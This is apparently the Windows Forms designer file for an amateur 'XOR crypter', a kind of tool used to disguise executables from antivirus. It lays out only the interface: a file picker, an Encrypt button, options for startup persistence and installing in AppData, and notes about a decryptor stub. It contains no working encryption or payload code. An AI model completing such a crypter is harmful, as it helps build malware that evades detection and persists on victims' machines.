namespace Crypter
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            openFileDialog1 = new OpenFileDialog();
            selectFileButton = new Button();
            encryptButton = new Button();
            txtFilePath = new Label();
            label1 = new Label();
            label2 = new Label();
            startup = new CheckBox();
            install = new CheckBox();
            label3 = new Label();
            comboBoxExtension = new ComboBox();
            label4 = new Label();
            label5 = new Label();
            SuspendLayout();
            // 
            // openFileDialog1
            // 
            openFileDialog1.FileName = "openFileDialog1";
            // 
            // selectFileButton
            // 
            selectFileButton.BackColor = Color.FromArgb(192, 192, 255);
            selectFileButton.FlatStyle = FlatStyle.Popup;
            selectFileButton.ForeColor = SystemColors.ControlText;
            selectFileButton.Location = new Point(12, 253);
            selectFileButton.Name = "selectFileButton";
            selectFileButton.Size = new Size(75, 23);
            selectFileButton.TabIndex = 0;
            selectFileButton.Text = "selectfile";
            selectFileButton.UseVisualStyleBackColor = false;
            selectFileButton.Click += selectFileButton_Click;
            // 
            // encryptButton
            // 
            encryptButton.BackColor = Color.FromArgb(128, 128, 255);
            encryptButton.FlatStyle = FlatStyle.Flat;
            encryptButton.ForeColor = Color.Black;
            encryptButton.Location = new Point(293, 296);
            encryptButton.Name = "encryptButton";
            encryptButton.Size = new Size(75, 33);
            encryptButton.TabIndex = 1;
            encryptButton.Text = "Encrypt";
            encryptButton.UseVisualStyleBackColor = false;
            encryptButton.Click += encryptButton_Click;
            // 
            // txtFilePath
            // 
            txtFilePath.AutoSize = true;
            txtFilePath.ForeColor = Color.FromArgb(128, 128, 255);
            txtFilePath.Location = new Point(12, 114);
            txtFilePath.Name = "txtFilePath";
            txtFilePath.Size = new Size(38, 15);
            txtFilePath.TabIndex = 2;
            txtFilePath.Text = "label1";
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.BackColor = Color.Black;
            label1.ForeColor = Color.FromArgb(128, 128, 255);
            label1.Location = new Point(12, 9);
            label1.Name = "label1";
            label1.Size = new Size(70, 15);
            label1.TabIndex = 4;
            label1.Text = "XOR crypter";
            // 
            // label2
            // 
            label2.AutoSize = true;
            label2.ForeColor = Color.FromArgb(128, 128, 255);
            label2.Location = new Point(12, 314);
            label2.Name = "label2";
            label2.Size = new Size(97, 15);
            label2.TabIndex = 6;
            label2.Text = "made by rikserok";
            // 
            // startup
            // 
            startup.AutoSize = true;
            startup.ForeColor = Color.FromArgb(128, 128, 255);
            startup.Location = new Point(12, 132);
            startup.Name = "startup";
            startup.Size = new Size(63, 19);
            startup.TabIndex = 7;
            startup.Text = "startup";
            startup.UseVisualStyleBackColor = true;
            // 
            // install
            // 
            install.AutoSize = true;
            install.ForeColor = Color.FromArgb(128, 128, 255);
            install.Location = new Point(12, 157);
            install.Name = "install";
            install.Size = new Size(116, 19);
            install.TabIndex = 9;
            install.Text = "install in appdata";
            install.UseVisualStyleBackColor = true;
            // 
            // label3
            // 
            label3.AutoSize = true;
            label3.ForeColor = Color.FromArgb(128, 128, 255);
            label3.Location = new Point(9, 179);
            label3.Name = "label3";
            label3.Size = new Size(117, 15);
            label3.TabIndex = 11;
            label3.Text = "choose file extension";
            // 
            // comboBoxExtension
            // 
            comboBoxExtension.FormattingEnabled = true;
            comboBoxExtension.Items.AddRange(new object[] { ".lol", ".enc", ".dll", ".resx" });
            comboBoxExtension.Location = new Point(12, 197);
            comboBoxExtension.Name = "comboBoxExtension";
            comboBoxExtension.Size = new Size(121, 23);
            comboBoxExtension.TabIndex = 12;
            // 
            // label4
            // 
            label4.AutoSize = true;
            label4.Font = new Font("Segoe UI", 7F);
            label4.ForeColor = Color.FromArgb(128, 128, 255);
            label4.Location = new Point(195, 173);
            label4.Name = "label4";
            label4.Size = new Size(143, 96);
            label4.TabIndex = 13;
            label4.Text = "Warning!\r\nThere can be only\r\none file with the\r\nsame extension in the\r\nfolder with the decryptor (stub).\r\nFor e.g. if you choose .dll\r\nthere cant be any other .dlls\r\nin the same folder\r\n";
            // 
            // label5
            // 
            label5.AutoSize = true;
            label5.Font = new Font("Segoe UI", 7F);
            label5.ForeColor = Color.FromArgb(128, 128, 255);
            label5.Location = new Point(195, 269);
            label5.Name = "label5";
            label5.Size = new Size(180, 12);
            label5.TabIndex = 14;
            label5.Text = "i will probably fix that in a future update";
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(64, 64, 64);
            ClientSize = new Size(380, 338);
            Controls.Add(label5);
            Controls.Add(label4);
            Controls.Add(comboBoxExtension);
            Controls.Add(label3);
            Controls.Add(install);
            Controls.Add(startup);
            Controls.Add(label2);
            Controls.Add(label1);
            Controls.Add(txtFilePath);
            Controls.Add(encryptButton);
            Controls.Add(selectFileButton);
            ForeColor = Color.FromArgb(128, 128, 255);
            MaximizeBox = false;
            Name = "Form1";
            Text = "Crypter";
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private OpenFileDialog openFileDialog1;
        private Button selectFileButton;
        private Button encryptButton;
        private Label txtFilePath;
        private Label label1;
        private Label label2;
        private CheckBox startup;
        private CheckBox install;
        private Label label3;
        private ComboBox comboBoxExtension;
        private Label label4;
        private Label label5;
    }
}
